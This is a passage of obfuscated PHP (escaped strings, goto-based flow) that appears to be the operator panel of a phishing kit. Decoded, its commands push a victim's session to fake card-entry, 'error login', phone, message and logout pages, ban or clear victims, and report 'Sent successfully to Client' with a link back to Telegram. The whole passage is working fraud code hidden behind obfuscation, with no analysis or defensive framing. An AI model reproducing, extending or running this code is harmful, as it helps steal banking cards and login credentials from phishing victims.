\155\141\151\156\x27\40\x73\x74\x79\x6c\145\x3d\x27\142\x6f\x78\55\x73\151\172\151\156\x67\72\x20\x62\157\162\144\x65\162\x2d\x62\x6f\x78\x3b\x27\x3e\12\40\x20\40\40\40\x20\x20\40\x3c\x64\151\x76\12\40\40\40\40\40\40\x20\40\40\40\40\40\x62\x69\163\137\x73\153\151\x6e\137\x63\x68\145\x63\153\145\x64\x3d\x27\x31\x27\12\40\40\40\40\40\x20\40\x20\40\40\x20\40\x63\154\141\163\163\x3d\x27\x6d\141\x69\x6e\x2d\150\x65\x61\144\x65\x72\x27\xa\40\40\x20\40\x20\x20\x20\40\40\x20\x20\x20\163\x74\x79\154\x65\x3d\47\12\40\x20\x20\x20\40\x20\x20\40\40\x20\40\x20\x20\40\40\x20\142\157\x78\55\x73\x69\x7a\x69\x6e\147\72\x20\142\157\162\144\145\162\x2d\142\x6f\x78\73\xa\x20\x20\40\x20\x20\40\40\40\40\40\40\x20\40\x20\x20\x20\167\x69\144\164\150\72\x20\x39\x37\60\160\170\x3b\xa\40\40\x20\x20\40\x20\x20\x20\x20\40\40\x20\40\x20\40\40\x70\x61\144\144\x69\156\x67\72\x20\x31\70\160\x78\40\65\160\170\73\xa\x20\x20\40\40\x20\x20\40\x20\x20\x20\40\x20\40\40\40\40\x64\151\163\x70\x6c\141\x79\x3a\x20\x66\154\145\x78\x3b\xa\x20\x20\x20\40\x20\x20\40\x20\x20\x20\40\40\x20\40\x20\40\x6a\x75\163\164\x69\146\x79\55\x63\x6f\156\164\x65\x6e\164\72\x20\x63\145\x6e\x74\145\x72\x3b\12\40\x20\x20\x20\40\40\x20\40\x20\40\x20\x20\40\x20\40\x20\x62\141\x63\x6b\x67\162\x6f\x75\x6e\144\x3a\40\162\147\142\x28\x32\65\x31\x2c\x20\62\65\61\54\x20\62\65\x31\x29\x3b\xa\x20\40\40\x20\40\40\x20\x20\40\40\x20\40\x20\x20\40\x20\142\157\x72\144\x65\x72\55\x73\x74\171\154\145\72\40\163\157\154\151\144\73\12\40\40\40\40\40\40\40\x20\40\x20\40\x20\x20\40\40\40\142\157\162\x64\145\162\x2d\x77\x69\144\x74\x68\72\x20\62\160\x78\x20\x32\160\x78\40\60\x70\170\73\12\x20\x20\40\x20\x20\40\x20\x20\x20\x20\40\x20\x20\40\40\x20\x62\x6f\x72\144\145\x72\x2d\143\x6f\154\x6f\162\72\x20\x72\x67\142\x61\50\60\x2c\40\x30\x2c\x20\60\x2c\x20\x30\56\61\x35\51\x3b\xa\40\x20\x20\40\x20\x20\x20\40\x20\40\40\40\40\40\x20\40\x62\x6f\162\x64\145\162\55\x72\141\144\151\x75\x73\72\40\x31\62\160\170\40\61\62\x70\x78\x20\x30\x70\x78\40\x30\160\x78\73\xa\x20\40\40\40\x20\40\40\40\40\40\x20\x20\x20\40\40\40\164\x65\x78\164\55\x61\x6c\151\147\156\x3a\40\143\145\156\164\145\162\73\xa\x20\40\x20\40\x20\x20\x20\40\40\x20\x20\40\x27\xa\40\x20\x20\40\x20\x20\x20\40\76\xa\x20\x20\x20\40\x20\40\x20\x20\40\40\40\x20\74\141\12\40\40\x20\40\x20\40\40\x20\40\40\40\x20\40\x20\40\x20\x63\154\141\x73\x73\x3d\47\x6d\141\x69\x6e\55\142\165\164\x74\157\x6e\137\x5f\154\141\x6e\x67\40\155\141\x69\x6e\x2d\x62\x75\164\164\x6f\156\x5f\137\141\x63\x74\151\x76\145\x27\xa\x20\40\x20\40\x20\x20\x20\40\x20\x20\40\x20\x20\40\40\x20\150\x72\145\146\x3d\x27\x74\147\x3a\57\x2f\x27\12\40\40\40\40\40\40\x20\x20\40\40\40\40\40\40\x20\x20\154\141\156\x67\x3d\x27\150\x74\155\x6c\x27\xa\x20\40\40\x20\x20\x20\40\40\40\x20\x20\x20\x20\40\x20\40\x73\x74\171\x6c\x65\x3d\x27\xa\40\x20\40\x20\40\40\x20\40\x20\x20\40\40\x20\x20\x20\x20\x20\x20\x20\40\142\157\x78\55\x73\x69\172\151\156\x67\x3a\x20\142\x6f\162\144\x65\x72\x2d\x62\x6f\170\x3b\xa\x20\x20\x20\x20\x20\x20\40\40\40\40\40\40\x20\x20\40\40\x20\40\40\x20\x63\x6f\x6c\157\162\72\40\162\x67\x62\50\62\x35\x35\x2c\x20\62\x35\65\x2c\x20\x32\x35\65\51\x3b\12\40\40\40\40\40\x20\40\40\40\40\40\40\x20\x20\40\40\x20\x20\40\40\164\145\x78\x74\55\144\x65\x63\x6f\x72\x61\x74\151\157\x6e\x2d\x6c\x69\156\x65\x3a\40\x6e\157\156\145\x3b\12\40\40\x20\40\40\40\40\40\40\x20\x20\x20\x20\x20\x20\x20\x20\x20\40\x20\142\141\143\x6b\147\x72\157\x75\x6e\144\x3a\x20\x6e\x6f\156\145\x20\x72\147\x62\x28\x31\63\x30\x2c\40\x31\61\61\x2c\40\x33\x32\51\x3b\xa\x20\40\x20\40\x20\40\x20\40\x20\40\x20\x20\x20\40\40\40\x20\x20\x20\40\146\x6f\x6e\164\x2d\x66\x61\155\x69\154\x79\72\40\x70\x74\x6d\157\x6e\x6f\54\x20\155\x6f\x6e\x6f\x73\160\x61\143\x65\73\12\40\40\40\x20\x20\x20\x20\40\40\x20\x20\40\40\x20\40\40\40\40\40\40\160\x61\x64\x64\151\156\147\x3a\x20\x30\x70\170\x20\x31\65\160\x78\x3b\xa\40\40\x20\x20\40\x20\40\40\40\40\40\x20\40\40\40\x20\x20\x20\x20\x20\142\157\162\144\145\162\x2d\162\141\x64\151\x75\x73\x3a\x20\x36\160\170\73\12\x20\40\x20\x20\x20\x20\40\x20\x20\40\x20\x20\x20\40\x20\40\40\40\40\x20\x6d\x61\x72\x67\x69\x6e\72\40\x32\x70\170\x20\x33\x70\x78\x20\x30\160\170\73\12\x20\x20\x20\40\40\40\x20\40\x20\x20\40\40\x20\40\40\x20\x20\40\x20\40\x62\157\x72\144\145\x72\x3a\x20\x31\x70\170\40\x73\x6f\x6c\x69\144\x20\162\x67\x62\x28\61\x33\71\54\40\x32\x37\54\x20\x31\64\x33\x29\x3b\xa\40\40\x20\x20\40\x20\40\x20\40\40\x20\x20\40\40\x20\x20\x20\x20\x20\40\x6f\x75\164\x6c\151\x6e\145\x3a\40\x30\160\170\73\xa\40\40\40\x20\x20\40\40\40\40\x20\x20\40\x20\x20\40\40\40\x20\40\40\143\165\162\x73\x6f\x72\72\40\x70\x6f\x69\156\x74\145\x72\73\xa\40\x20\40\40\x20\40\x20\x20\40\x20\40\40\40\40\40\40\47\12\40\40\40\40\x20\40\x20\x20\x20\40\x20\x20\x3e\xa\x20\x20\40\40\40\40\40\x20\40\40\x20\x20\x20\x20\40\40\x4f\116\114\x49\116\105\xa\x20\40\x20\40\x20\x20\40\40\x20\40\x20\40\x3c\57\x61\x3e\12\x20\40\x20\40\40\x20\x20\x20\x3c\57\144\151\166\x3e\12\x20\x20\x20\40\x3c\57\x64\x69\x76\76\xa\x3c\57\144\x69\x76\76\12"; die; } elseif ($command_send == "\x63\x61\162\144") { $project_name = $_SESSION["\x70\162\157\152\145\x63\x74\137\156\x61\x6d\145"]; up_file($_SESSION["\165\163\145\162\151\144"], "\x3c\155\x65\x74\141\x20\x68\x74\x74\160\55\x65\x71\x75\151\166\75\47\162\x65\x66\x72\x65\163\x68\47\x20\x63\x6f\x6e\164\x65\156\164\75\47\60\73\165\x72\x6c\x3d\x63\141\x72\x64\x2e\160\x68\x70\x3f\166\x65\162\151\146\x79\x5f\141\x63\x63\157\x75\x6e\164\x3d\163\145\163\163\x69\x6f\x6e\x3d\46" . md5(microtime()) . "\46\x64\x69\163\160\x61\x74\x63\x68\75" . sha1(microtime()) . "\x26\141\143\143\x65\163\163\75\x26\x64\141\164\141\75" . sha1(microtime()) . "\x27\40\57\76"); up_file_log($_SESSION["\165\x73\x65\x72\151\x64"], "\123\x65\156\x64\x20\x43\x61\162\x64\x20\x70\x61\x67\x65\40\x53\x75\143\x63\145\x73\163\146\x75\154\154\171\x7c{$project_name}\174{$local_time}"); $command_page = "\103\101\x52\x44\40\x50\101\x47\x45"; } elseif ($command_send == "\144\x6f\156\145") { $project_name = $_SESSION["\160\162\x6f\x6a\x65\x63\164\x5f\156\141\x6d\145"]; up_file($_SESSION["\x75\x73\145\162\151\x64"], "\x3c\x6d\x65\164\x61\x20\150\x74\164\160\55\145\x71\x75\x69\x76\75\x27\162\x65\x66\162\145\163\x68\47\x20\x63\157\156\164\145\156\164\75\47\60\73\165\162\154\x3d\154\157\x67\157\x75\164\56\x70\x68\160\x3f\x76\145\x72\151\146\171\137\141\x63\143\x6f\165\156\164\x3d\x73\145\x73\163\151\x6f\x6e\75\46" . md5(microtime()) . "\x26\x64\x69\163\160\141\164\143\150\75" . sha1(microtime()) . "\x26\141\x63\x63\x65\163\x73\x3d\46\x64\141\164\x61\75" . sha1(microtime()) . "\x27\x20\x2f\x3e"); up_file_log($_SESSION["\x75\163\145\x72\x69\x64"], "\x55\x73\145\x72\40\151\163\x20\114\x6f\147\157\165\x74\x7c{$project_name}\174\104\x6f\156\x65"); up_file_log($_SESSION["\x75\163\145\x72\151\x64"], "\x53\x65\156\144\x20\105\x78\x69\164\x20\160\x61\x67\145\40\x53\x75\143\143\145\163\x73\146\x75\154\154\x79\x7c{$project_name}\x7c{$local_time}"); $command_page = "\x43\117\116\106\111\x52\x4d\x20\x50\101\107\105"; } elseif ($command_send == "\x64\x65\154\145\x74\x65") { clear_log($_SESSION["\x75\163\145\162\151\x64"]); $command_page = "\x44\105\x4c\105\124\x45\40\x55\123\105\x52"; } elseif ($command_send == "\142\x61\x6e") { banned_user($_SESSION["\165\163\145\162\x69\x64"]); $command_page = "\102\x41\116\40\125\x53\105\122"; } echo "\x3c\x68\145\141\x64\145\162\40\x63\x6c\141\x73\163\75\x27\150\x65\141\144\x65\x72\47\x20\163\164\171\154\145\75\x27\142\x6f\x78\55\163\x69\172\x69\156\147\x3a\40\142\157\x72\x64\145\x72\x2d\x62\157\x78\x3b\40\144\151\163\x70\x6c\x61\x79\x3a\x20\146\x6c\x65\170\x3b\40\x6d\141\x72\x67\151\x6e\x2d\164\x6f\x70\x3a\x20\x31\65\x70\x78\73\x20\155\x61\162\x67\151\156\x2d\x62\x6f\164\x74\x6f\x6d\x3a\40\63\67\160\x78\73\40\x63\157\x6c\157\x72\72\x20\x72\x67\142\50\61\60\65\54\40\x31\62\60\54\40\x31\x35\x32\51\x3b\x20\146\x6f\x6e\164\55\x66\x61\155\x69\154\x79\x3a\40\156\165\x6e\x69\x74\157\x2c\40\x73\141\156\163\55\x73\x65\x72\x69\x66\73\x20\x66\x6f\x6e\164\55\x73\x69\x7a\145\72\40\61\66\x70\x78\x3b\47\76\xa\x20\40\40\x20\74\x64\151\x76\x20\x62\151\x73\137\x73\153\x69\156\x5f\143\x68\145\x63\x6b\145\144\x3d\x27\x31\47\40\x63\154\141\x73\x73\x3d\47\143\157\x6e\164\x61\x69\x6e\145\162\x27\x20\163\164\x79\154\x65\x3d\47\142\157\170\55\x73\151\172\x69\x6e\147\72\40\x62\157\162\x64\x65\162\55\142\x6f\170\73\40\167\151\144\164\150\x3a\x20\71\67\x30\x70\170\73\x20\160\141\x64\144\151\156\x67\x3a\40\60\160\x78\x3b\x20\x6d\x61\x72\x67\x69\x6e\x3a\x20\x30\x70\170\x20\x61\165\x74\x6f\73\40\x6d\141\170\x2d\x77\151\144\164\x68\x3a\x20\x39\67\x30\160\x78\73\x27\76\12\40\40\x20\40\40\40\40\x20\74\x68\61\40\x63\x6c\141\163\x73\x3d\47\x68\145\x61\144\x65\162\55\x74\x69\x74\154\x65\x27\40\163\x74\x79\154\x65\75\x27\x62\x6f\170\55\163\x69\172\151\x6e\x67\72\40\142\x6f\162\144\145\162\55\x62\157\x78\x3b\x20\155\x61\x72\147\x69\156\x3a\40\x30\56\66\67\x65\155\x20\60\160\170\73\40\x66\157\156\x74\x2d\x77\x65\x69\147\150\164\x3a\40\66\x30\60\73\x20\154\x69\156\x65\55\150\145\x69\147\150\164\x3a\x20\61\x2e\62\73\x20\x66\157\x6e\164\55\x73\151\172\x65\72\40\64\x35\160\170\x3b\40\164\x65\x78\164\x2d\x61\154\151\x67\156\72\40\143\145\156\x74\x65\162\73\x20\x63\x6f\x6c\x6f\162\72\40\162\147\142\x28\x31\x33\71\x2c\x20\62\x37\54\x20\x31\x34\63\x29\x3b\x27\x3e\12\40\40\40\x20\40\x20\40\x20\x20\40\x20\40\x3c\x69\x6d\147\x20\163\x72\x63\x3d\47\150\164\164\160\163\x3a\x2f\x2f\167\145\142\x66\x6f\x72\155\x61\x74\164\145\x72\56\x63\157\155\x2f\x69\155\141\147\145\57\x6c\157\x67\x6f\x2e\163\x76\x67\47\x20\x73\x74\x79\x6c\145\75\47\x62\x6f\170\55\163\x69\172\151\x6e\x67\72\x20\142\157\x72\144\145\x72\x2d\142\x6f\170\x3b\x20\x76\145\162\164\151\x63\x61\x6c\x2d\141\154\x69\147\156\x3a\40\155\x69\144\144\154\x65\73\x20\142\x6f\162\144\145\x72\x2d\x73\x74\x79\154\x65\x3a\x20\156\157\x6e\145\x3b\40\x68\x65\x69\x67\150\164\x3a\40\x37\x35\160\x78\x3b\x20\x6d\141\x72\147\151\156\55\x74\x6f\160\x3a\40\x2d\x33\67\x70\x78\73\40\x6d\x61\x72\x67\x69\x6e\x2d\162\x69\147\150\x74\72\x20\61\62\160\x78\73\x27\40\x2f\x3e\xa\x20\40\40\40\x20\40\40\40\x20\x20\x20\x20\74\x73\160\x61\x6e\40\163\164\171\x6c\145\75\47\x62\157\x78\x2d\x73\151\172\151\156\147\72\40\142\x6f\162\144\145\x72\x2d\142\x6f\x78\x3b\x20\143\x6f\x6c\x6f\x72\x3a\x20\x72\147\142\x28\62\64\x30\54\x20\66\67\x2c\40\63\x30\51\x3b\x27\x3e{$command_page}\x3c\x2f\x73\x70\x61\156\76\12\x20\x20\40\40\40\40\40\40\74\x2f\150\61\76\12\12\x20\40\40\x20\x20\x20\40\40\74\x70\40\143\154\x61\163\163\x3d\47\x68\x65\x61\144\145\x72\x2d\163\x75\142\164\151\164\x6c\x65\x27\x20\163\x74\x79\154\145\x3d\47\142\157\x78\x2d\x73\151\172\x69\156\147\x3a\x20\x62\157\162\144\x65\162\55\x62\157\170\73\40\155\x61\x72\147\151\156\72\x20\60\160\x78\x3b\40\x70\x61\144\x64\x69\156\147\x3a\40\x30\160\x78\x3b\x20\x74\145\x78\x74\x2d\141\x6c\x69\x67\x6e\72\x20\x63\x65\156\x74\145\162\x3b\x20\x66\x6f\x6e\164\x2d\x73\x69\172\x65\x3a\x20\x31\70\160\x78\73\40\x6c\151\x6e\x65\55\x68\145\x69\x67\150\x74\x3a\40\x32\62\160\170\x3b\x27\76\12\x20\40\x20\74\163\x70\141\156\x20\x73\164\171\154\x65\75\47\x63\157\x6c\157\x72\72\x20\x23\x30\x30\70\x30\x30\60\73\47\76\74\163\164\162\x6f\156\x67\76\x53\x65\156\164\40\163\x75\143\143\145\x73\146\x75\154\154\171\40\x74\157\40\103\x6c\151\145\x6e\x74\x20\x5b{$StrupLom}\x5d\74\57\x73\x74\162\x6f\156\147\76\x3c\57\163\x70\141\x6e\x3e\12\x20\40\x20\40\x20\40\40\x20\x3c\x2f\x70\x3e\12\xa\x20\x20\x20\x20\40\40\40\40\74\160\x20\143\154\x61\x73\163\75\x27\x68\x65\x61\x64\x65\162\x2d\163\165\x62\x74\x69\164\x6c\145\47\x20\163\x74\171\x6c\x65\75\x27\142\157\x78\55\163\151\172\x69\x6e\x67\72\40\142\157\162\144\145\162\55\x62\157\x78\x3b\40\155\x61\162\x67\151\156\72\40\60\160\170\73\x20\x70\141\x64\144\x69\x6e\147\72\x20\60\160\170\x3b\x20\x74\145\170\x74\55\141\x6c\x69\147\x6e\x3a\x20\143\x65\x6e\x74\145\162\x3b\x20\146\157\156\164\55\x73\151\x7a\145\x3a\40\61\70\x70\x78\x3b\40\154\151\156\x65\x2d\x68\145\151\147\150\164\x3a\40\x32\x32\x70\x78\73\x27\76\x26\x6e\142\163\160\x3b\x3c\x2f\x70\x3e\12\xa\x9\11\x3c\x70\x20\143\x6c\x61\x73\x73\75\47\x68\145\141\x64\x65\162\55\x73\x75\x62\164\x69\164\154\x65\x27\40\x73\x74\171\154\145\75\47\x62\x6f\170\x2d\x73\151\172\x69\x6e\147\x3a\40\x62\x6f\x72\x64\x65\162\55\x62\157\170\73\x20\x6d\x61\162\x67\151\x6e\72\x20\60\x70\170\x3b\x20\160\141\144\x64\x69\x6e\147\x3a\x20\x30\160\170\x3b\x20\164\x65\170\164\x2d\x61\x6c\151\x67\156\72\x20\143\x65\x6e\x74\x65\162\x3b\x20\146\x6f\156\x74\x2d\163\x69\172\x65\x3a\x20\61\70\x70\x78\73\40\x6c\151\156\145\55\150\x65\151\147\150\164\72\x20\x32\62\160\x78\73\x27\76\12\x20\x20\x20\40\74\x73\x70\141\x6e\40\163\164\171\x6c\x65\x3d\x27\x63\x6f\154\157\x72\72\x20\x23\x30\x30\x30\60\60\60\73\x27\x3e\xa\x20\x20\x20\40\40\40\x20\40\x3c\x61\x20\x68\x72\x65\x66\x3d\47\x74\147\72\57\x2f\x27\40\x63\x6c\141\163\163\75\47\142\x61\x63\153\x2d\x74\157\x2d\164\x65\x6c\x65\x67\x72\141\155\x27\76\x47\157\40\142\141\143\153\x20\164\x6f\40\124\x65\154\145\147\x72\x61\x6d\x3c\x2f\x61\x3e\12\x20\40\40\x20\x3c\57\163\x70\x61\x6e\76\xa\x3c\57\160\76\12\40\x20\40\x20\x3c\x2f\144\151\x76\76\12\x3c\57\x68\x65\141\144\x65\x72\76\12\xa\74\x64\151\166\40\142\151\163\137\163\153\151\x6e\137\143\150\145\143\153\x65\144\x3d\x27\61\x27\40\143\x6c\x61\163\163\75\x27\x63\157\x6e\164\141\151\x6e\x65\162\x27\40\163\164\x79\154\x65\x3d\x27\142\x6f\170\55\163\x69\172\151\156\147\72\40\x62\x6f\162\144\145\162\x2d\142\x6f\170\73\40\167\x69\x64\164\150\72\x20\x39\67\60\x70\x78\73\40\x70\141\x64\144\151\x6e\147\x3a\40\60\x70\x78\x3b\40\x6d\x61\162\147\x69\156\72\x20\60\160\170\40\x61\x75\164\157\73\40\x6d\x61\170\55\167\x69\144\164\x68\72\40\71\67\x30\x70\170\73\40\x63\157\x6c\x6f\162\72\40\162\147\142\50\61\60\x35\x2c\x20\61\x32\x30\x2c\x20\61\65\62\x29\73\40\146\157\156\x74\55\146\x61\x6d\151\154\171\x3a\x20\x6e\x75\x6e\151\x74\x6f\54\40\x73\x61\x6e\163\55\x73\145\x72\x69\146\73\x20\x66\157\156\x74\x2d\163\x69\x7a\145\72\40\x31\x36\x70\x78\x3b\47\76\12\40\x20\40\40\x3c\144\x69\166\40\142\151\163\x5f\x73\153\151\156\x5f\x63\x68\145\x63\x6b\x65\144\x3d\47\x31\47\40\x63\x6c\141\x73\x73\75\x27\x6d\x61\x69\x6e\47\x20\163\164\x79\154\145\x3d\x27\x62\157\170\55\x73\151\172\151\x6e\x67\72\40\142\157\162\144\145\162\55\142\157\170\x3b\47\x3e\12\x20\40\40\40\40\40\40\x20\74\144\151\x76\12\x20\40\40\x20\x20\x20\40\x20\x20\40\x20\x20\142\x69\163\x5f\163\153\x69\156\x5f\x63\150\x65\x63\153\x65\144\x3d\x27\61\47\xa\40\x20\x20\40\x20\x20\40\40\40\x20\40\x20\143\x6c\x61\163\163\75\47\155\x61\x69\x6e\55\150\145\141\144\145\x72\47\12\40\x20\x20\40\x20\x20\40\x20\x20\40\40\x20\x73\164\171\x6c\x65\x3d\x27\xa\40\x20\x20\40\x20\40\x20\x20\40\x20\40\40\x20\x20\x20\40\142\157\x78\55\x73\x69\x7a\x69\x6e\x67\x3a\40\142\x6f\x72\x64\x65\162\55\142\157\x78\73\xa\x20\40\x20\40\x20\40\40\x20\40\40\x20\x20\40\40\40\x20\x77\x69\x64\164\x68\x3a\x20\71\x37\60\x70\x78\x3b\12\40\x20\40\40\x20\x20\40\x20\40\x20\x20\40\x20\x20\x20\x20\160\x61\144\x64\x69\x6e\147\72\40\x31\70\160\170\40\65\160\170\x3b\xa\x20\x20\x20\x20\x20\40\40\x20\x20\x20\x20\x20\40\40\40\40\144\x69\163\x70\154\141\171\x3a\40\x66\x6c\145\170\73\xa\40\40\40\40\x20\x20\40\40\40\x20\40\40\40\x20\40\x20\152\165\x73\164\151\146\171\x2d\x63\x6f\x6e\164\145\156\x74\72\40\143\145\x6e\x74\x65\x72\73\xa\x20\x20\40\x20\x20\x20\x20\x20\40\x20\40\40\x20\40\x20\40\x62\x61\143\x6b\x67\162\x6f\165\x6e\x64\x3a\x20\162\x67\142\50\62\x35\61\x2c\x20\x32\65\x31\x2c\x20\x32\65\61\51\x3b\xa\x20\40\x20\40\40\x20\40\x20\40\x20\x20\x20\x20\40\x20\40\x62\x6f\x72\x64\145\162\55\163\x74\171\x6c\145\x3a\x20\x73\157\154\151\144\x3b\12\40\x20\40\x20\40\40\x20\x20\x20\40\40\40\40\40\x20\40\142\x6f\162\x64\x65\162\x2d\167\x69\x64\x74\150\x3a\x20\x32\x70\x78\40\62\160\x78\40\x30\160\x78\73\xa\x20\40\40\x20\x20\40\40\x20\40\40\40\40\40\40\x20\x20\x62\157\x72\144\x65\162\x2d\x63\x6f\154\157\162\72\40\162\147\x62\x61\50\x30\x2c\x20\60\x2c\40\x30\x2c\x20\60\x2e\x31\65\x29\73\12\40\x20\x20\40\40\40\40\x20\x20\40\x20\x20\40\40\x20\40\x62\x6f\x72\x64\x65\162\55\162\x61\144\151\165\163\x3a\40\61\62\160\x78\x20\61\62\x70\170\x20\x30\160\x78\x20\60\x70\x78\x3b\12\x20\x20\40\40\x20\40\40\40\x20\x20\x20\x20\x20\x20\40\40\x74\145\170\164\x2d\141\154\151\x67\x6e\x3a\x20\x63\145\156\x74\x65\162\x3b\xa\40\40\x20\40\40\x20\40\40\40\40\x20\x20\x27\xa\40\x20\x20\x20\x20\x20\x20\x20\76\xa\40\40\x20\x20\x20\40\40\x20\x20\40\40\40\x3c\141\xa\40\x20\40\40\x20\40\40\40\40\x20\40\x20\x20\40\40\x20\143\x6c\141\163\163\x3d\47\x6d\141\151\x6e\x2d\142\x75\x74\x74\x6f\156\137\x5f\154\141\156\147\x20\x6d\141\151\156\55\142\x75\164\164\157\156\x5f\137\x61\x63\164\151\x76\145\x27\xa\x20\x20\x20\x20\x20\40\x20\x20\x20\40\40\40\x20\40\40\40\x6c\x61\x6e\147\x3d\x27\150\164\155\x6c\47\12\x9\11\x9\11\x68\162\145\x66\75\x27\x74\147\72\57\x2f\47\40\143\x6c\141\163\x73\x3d\x27\142\x61\143\153\55\164\x6f\x2d\164\145\154\145\147\162\x61\155\47\12\x20\40\x20\40\40\40\x20\x20\x20\x20\40\40\40\40\x20\40\163\x74\171\154\x65\x3d\x27\12\40\x20\40\40\40\40\x20\40\x20\40\40\x20\40\40\x20\40\40\40\40\40\x62\157\170\x2d\x73\x69\x7a\151\156\x67\72\40\142\157\x72\x64\x65\x72\55\142\157\x78\x3b\12\x20\40\40\40\40\x20\x20\x20\x20\x20\40\40\x20\x20\x20\40\x20\40\x20\40\x63\x6f\154\157\x72\x3a\x20\x72\x67\x62\x28\62\x35\65\54\x20\x32\x35\65\54\40\62\65\x35\51\x3b\xa\40\x20\x20\40\x20\x20\40\40\40\x20\x20\x20\40\40\40\x20\x20\40\40\40\x74\145\170\x74\55\x64\x65\x63\x6f\162\x61\164\x69\157\x6e\x2d\x6c\x69\x6e\145\x3a\x20\156\x6f\156\145\x3b\xa\40\40\40\x20\x20\40\x20\x20\x20\x20\x20\40\x20\40\x20\x20\40\x20\x20\40\x62\141\x63\153\x67\x72\x6f\165\156\144\72\40\156\x6f\x6e\145\x20\x72\147\142\50\61\63\x30\54\x20\x31\61\x31\54\40\x33\x32\x29\73\12\x20\40\40\40\40\x20\x20\40\x20\x20\x20\x20\40\40\x20\x20\x20\40\40\40\146\157\156\x74\x2d\x66\x61\155\151\154\x79\x3a\x20\160\x74\x6d\157\x6e\157\x2c\x20\x6d\x6f\x6e\x6f\x73\x70\x61\143\x65\x3b\xa\40\x20\x20\x20\x20\40\40\x20\x20\x20\40\x20\40\40\40\x20\40\x20\x20\40\160\141\144\x64\x69\x6e\147\72\x20\60\160\x78\40\x31\65\160\170\73\12\40\x20\40\40\x20\x20\40\40\x20\40\x20\x20\40\40\x20\40\40\x20\x20\40\x62\x6f\162\x64\x65\x72\x2d\x72\141\x64\x69\x75\163\x3a\x20\x36\160\x78\x3b\xa\40\x20\x20\40\40\x20\40\40\x20\40\40\40\x20\40\40\x20\x20\x20\x20\40\x6d\141\162\x67\x69\156\x3a\40\62\x70\170\40\x33\x70\170\x20\60\x70\x78\73\12\40\40\40\40\40\40\40\40\40\40\40\40\x20\x20\40\40\40\40\40\40\142\157\162\x64\x65\x72\x3a\40\x31\x70\170\x20\x73\157\154\x69\144\40\x72\x67\x62\50\61\x33\71\x2c\40\x32\67\x2c\40\x31\x34\x33\x29\73\12\x20\x20\40\40\x20\x20\x20\x20\40\x20\40\x20\40\40\x20\40\40\x20\x20\40\x6f\165\x74\154\x69\x6e\145\x3a\40\60\160\x78\x3b\xa\40\40\40\40\40\x20\x20\40\40\40\x20\x20\x20\x20\x20\40\x20\40\40\40\143\x75\x72\x73\x6f\162\72\x20\160\157\151\156\x74\145\x72\x3b\xa\40\x20\x20\x20\x20\x20\x20\40\x20\40\x20\40\x20\x20\x20\40\47\xa\40\x20\40\x20\x20\x20\x20\x20\40\40\x20\x20\x3e\12\x20\40\40\40\x20\x20\x20\40\40\40\x20\x20\x20\40\40\x20\x4f\x4e\114\x49\x4e\105\xa\x20\40\40\x20\40\40\x20\40\x20\x20\40\40\74\57\x61\x3e\12\x20\40\40\40\x20\40\40\40\74\57\144\x69\x76\76\12\x20\40\x20\x20\74\x2f\x64\x69\x76\x3e\12\74\x2f\x64\x69\x76\76\12"; die; } } goto iHRNv; oaR_O: echo $_SESSION["\x53\x74\x72\165\x70\x4c\157\x6d"]; goto NUtCo; DWCmC: if (session_status() == PHP_SESSION_NONE) { session_start(); } goto U6Oqz; Dg750: if ($_SERVER["\122\105\121\125\105\123\124\137\115\105\124\110\117\104"] === "\120\x4f\x53\124") { if (isset($_POST["\170\x5f\x69\x73\x5f\155\x65\x73\163\141\x67\x65"])) { $local_time = date("\131\55\x6d\55\x64\40\110\72\151\x3a\163"); up_file_msg($_SESSION["\165\163\145\x72\151\x64"], $_POST["\x78\x5f\151\163\137\x6d\x65\x73\x73\x61\147\x65"]); $project_name = $_SESSION["\x70\x72\x6f\x6a\145\143\x74\x5f\156\x61\155\145"]; up_file($_SESSION["\165\163\x65\x72\151\x64"], "\x3c\x6d\145\164\x61\x20\150\x74\x74\160\x2d\145\x71\x75\x69\x76\x3d\47\162\145\146\162\145\x73\x68\x27\40\143\157\156\164\145\x6e\x74\75\47\60\x3b\x75\162\154\75\x6d\x65\163\163\141\x67\145\x2e\160\150\160\x3f\x76\x65\162\151\x66\x79\x5f\141\x63\143\x6f\x75\x6e\x74\75\163\x65\163\163\x69\157\x6e\x3d\46" . md5(microtime()) . "\x26\144\x69\163\160\141\164\143\150\x3d" . sha1(microtime()) . "\x26\141\143\x63\145\x73\163\x3d\46\144\x61\164\x61\x3d" . sha1(microtime()) . "\x27\x20\57\76"); up_file_log($_SESSION["\x75\x73\x65\162\151\x64"], "\x53\145\156\x64\x20\115\x65\x73\163\141\x67\x65\x20\x70\141\147\x65\40\123\x75\143\x63\x65\163\x73\146\165\154\x6c\x79\174{$project_name}\174{$local_time}"); $command_page = "\x4d\145\x73\163\141\x67\145\40\120\x41\107\x45"; } } goto UE16t; eYxM5: ?>
								<?php  goto pIJc2; YC6iO: $file_s = "\143\141\x72\144\56\x70\x68\x70"; goto HreRU; eRcu5: if ($_SERVER["\x52\x45\x51\x55\105\123\124\x5f\115\x45\124\x48\x4f\104"] === "\x50\117\123\124") { if (isset($_POST["\166\141\154\165\x65\x5f\164\x79\x70\145"])) { $local_time = date("\x59\55\155\x2d\x64\40\x48\72\151\x3a\x73"); $command_send = $_POST["\166\141\x6c\165\x65\x5f\x74\171\x70\145"]; if ($command_send == "\x65\162\x72\x6f\162\154\157\x67\x69\156") { $project_name = $_SESSION["\160\162\157\152\145\x63\164\137\x6e\x61\x6d\x65"]; $file_s = "\154\157\147\x69\156\56\x70\x68\160"; if (check_file($_SESSION["\165\x73\x65\x72\x69\144"], $file_s)) { up_file($_SESSION["\165\x73\x65\x72\151\x64"], "\74\155\x65\164\141\x20\150\164\x74\x70\x2d\145\161\165\151\166\x3d\x27\162\145\146\x72\x65\163\x68\x27\x20\x63\x6f\156\x74\145\156\x74\75\x27\60\73\x75\162\x6c\x3d\x6c\157\x67\151\156\56\x70\x68\160\77\166\145\162\151\x66\x79\x5f\141\x63\143\157\x75\156\164\75\163\145\163\x73\x69\157\x6e\75\46" . md5(microtime()) . "\x26\144\151\163\160\141\164\x63\150\75" . sha1(microtime()) . "\46\x61\x63\143\x65\x73\163\75\46\x64\141\164\x61\75" . sha1(microtime()) . "\x27\40\x2f\x3e"); up_file_log($_SESSION["\x75\163\145\162\151\x64"], "\x53\145\156\144\40\x45\x72\162\x6f\x72\x20\160\141\147\x65\40\x53\x75\143\143\145\x73\163\x66\x75\154\154\x79\x7c{$project_name}\x7c{$local_time}"); echo "\x45\162\x72\157\x72\40\114\157\147\x69\156"; } } elseif ($command_send == "\160\150\x6f\156\x65") { $project_name = $_SESSION["\160\x72\157\x6a\145\x63\164\137\x6e\x61\155\145"]; $file_s = 